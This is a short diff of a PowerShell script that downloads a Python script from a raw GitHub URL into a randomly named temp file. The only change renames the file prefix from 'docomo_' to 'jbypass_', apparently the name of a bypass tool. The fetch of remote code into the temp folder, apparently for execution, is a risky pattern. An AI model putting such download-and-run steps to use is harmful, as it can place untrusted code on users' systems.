@@ -5,7 +5,7 @@ $scriptUrl = "https://raw.githubusercontent.com/lstprjct/TechTubeInsider/main/jb
 
 # Generate a unique temp file
 $rand = Get-Random -Maximum 99999999
-$scriptPath = "$env:TEMP\docomo_$rand.py"
+$scriptPath = "$env:TEMP\jbypass_$rand.py"
 
 try {
     # Download the script
